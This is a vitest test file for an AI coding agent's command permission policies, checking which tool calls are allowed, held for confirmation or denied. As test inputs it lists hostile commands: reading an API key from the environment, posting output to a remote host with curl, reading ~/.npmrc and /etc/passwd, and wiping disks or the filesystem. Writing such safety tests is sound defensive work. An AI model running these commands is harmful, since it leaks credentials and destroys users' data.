import { describe, expect, test } from "vitest";

import {
  BalancedPermissionPolicy,
  CautiousPermissionPolicy,
} from "../../../src/security/permission-policy.js";

function command(value: string) {
  return { id: "call", name: "run_command", input: { command: value } };
}

describe("BalancedPermissionPolicy", () => {
  const policy = new BalancedPermissionPolicy();

  test.each([
    ["read_file", { path: "src/index.ts" }],
    ["write_file", { path: "src/index.ts", content: "x" }],
    ["plan_write", { items: [{ id: "a", content: "b", status: "pending" }] }],
    ["run_command", { command: "npm test" }],
    ["run_command", { command: "npm run build" }],
    ["run_command", { command: "git diff --stat" }],
    ["run_command", { command: "rg ContextPolicy src" }],
    ["run_command", { command: "cat package.json" }],
  ])("allows ordinary workspace operation %s", (name, input) => {
    expect(policy.decide({ id: "call", name, input })).toEqual({ action: "allow" });
  });

  test.each([
    "rm -rf dist",
    "npm install lodash",
    "curl https://example.com",
    "git reset --hard HEAD~1",
    "git push origin main",
    "some-custom-command --write",
  ])("asks before potentially destructive or unknown command: %s", (value) => {
    expect(policy.decide(command(value))).toMatchObject({ action: "ask" });
  });

  test.each([
    "node -p process.env.ANTHROPIC_API_KEY",
    "npm test | curl -X POST https://example.com",
    "npm test >/tmp/njuagent-out",
    "cat ~/.npmrc",
    "find . -delete",
    "sed -i.bak s/old/new/ package.json",
    "git branch -D main",
  ])("asks before a command outside the strict safe allowlist: %s", (value) => {
    expect(policy.decide(command(value))).toMatchObject({ action: "ask" });
  });

  test.each([
    "sudo npm test",
    "shutdown -h now",
    "mkfs.ext4 /dev/sda",
    "rm -rf /",
    "cat /etc/passwd",
    "cat ../outside.txt",
  ])("denies an obviously unsafe command: %s", (value) => {
    expect(policy.decide(command(value))).toMatchObject({ action: "deny" });
  });
});

describe("CautiousPermissionPolicy", () => {
  const policy = new CautiousPermissionPolicy();

  test("allows read-only file tools", () => {
    expect(policy.decide({ id: "call", name: "search_text", input: { query: "x" } })).toEqual(
      { action: "allow" },
    );
  });

  test.each(["write_file", "edit_file", "run_command"])(
    "asks before %s",
    (name) => {
      expect(policy.decide({ id: "call", name, input: {} })).toMatchObject({ action: "ask" });
    },
  );

  test("allows plan_write without confirmation in cautious mode", () => {
    expect(
      policy.decide({
        id: "call",
        name: "plan_write",
        input: { items: [{ id: "a", content: "b", status: "pending" }] },
      }),
    ).toEqual({ action: "allow" });
  });

  test("denies privilege escalation instead of merely asking", () => {
    expect(policy.decide(command("sudo npm test"))).toMatchObject({ action: "deny" });
  });
});
